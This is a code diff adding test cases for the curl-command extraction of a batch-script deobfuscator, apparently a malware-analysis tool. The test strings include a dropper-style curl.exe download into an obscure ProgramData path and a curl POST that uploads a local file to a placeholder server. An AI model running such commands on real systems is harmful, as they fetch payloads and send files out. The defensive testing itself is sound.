@@ -51,6 +51,33 @@ from batch_deobfuscator.batch_interpreter import BatchDeobfuscator
                 {"src": "http://localhost:5572/rc/noop?rutabaga=3&potato=4", "dst": None},
             ),
         ),
+        (
+            "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat",
+            (
+                "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat",
+                {"src": "1.1.1.1/4.dat", "dst": "C:\\ProgramData\\Pterds\\HErtop.pos"},
+            ),
+        ),
+        (
+            r'curl -X POST --fail -H "Content-type: application/x-www-form-urlencoded" -H "Accept: application/json" -H "Authorization: Bearer token=aaaaaaaaaaaaaaaaa" http://server.com/data?style=table',
+            (
+                r'curl -X POST --fail -H "Content-type: application/x-www-form-urlencoded" -H "Accept: application/json" -H "Authorization: Bearer token=aaaaaaaaaaaaaaaaa" http://server.com/data?style=table',
+                {
+                    "src": "http://server.com/data?style=table",
+                    "dst": None,
+                },
+            ),
+        ),
+        (
+            r'curl -X POST --fail -H "Content-type: application/octet-stream" -H "Accept: application/json" -H "Content-Disposition: attachment; filename=myupload.file" -H "Authorization: Bearer token=aaaaaaaaaaaaaaaaa" --data-binary "@some\path\with\my\file.data" http://server.com/upload?overwrite=true',
+            (
+                r'curl -X POST --fail -H "Content-type: application/octet-stream" -H "Accept: application/json" -H "Content-Disposition: attachment; filename=myupload.file" -H "Authorization: Bearer token=aaaaaaaaaaaaaaaaa" --data-binary "@some\path\with\my\file.data" http://server.com/upload?overwrite=true',
+                {
+                    "src": "http://server.com/upload?overwrite=true",
+                    "dst": None,
+                },
+            ),
+        ),
     ],
 )
 def test_curl_extraction(statement, download_trait):
